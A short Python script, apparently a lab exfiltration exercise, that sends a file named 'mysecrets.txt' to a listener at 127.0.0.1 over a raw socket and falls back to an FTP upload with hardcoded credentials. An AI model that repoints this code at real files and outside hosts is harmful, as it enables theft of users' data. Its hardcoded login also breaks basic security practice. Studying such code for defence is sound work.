import ftplib
import os
import socket
import win32file

server = '127.0.0.1'
def plain_ftp(docpath, server):
    ftp = ftplib.FTP(server)                                                            #connected to setup ftp server
    ftp.login("Admin", "3Ther1")                                                        #login to server
    ftp.cwd('/pub/')                                                                    #travel to file path
    ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, "rb"), 1024)     #Write file to directory
    ftp.quit()

def transmit(document_path):
    client = socket.socket()
    client.connect((server, 10000))
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(client, win32file._get_osfhandle(f.fileno()), 0,0,None,0,b'',b'')

if __name__ == '__main__':
    try:
        transmit('mysecrets.txt')
    except:
        plain_ftp('mysecrets.txt', server)

        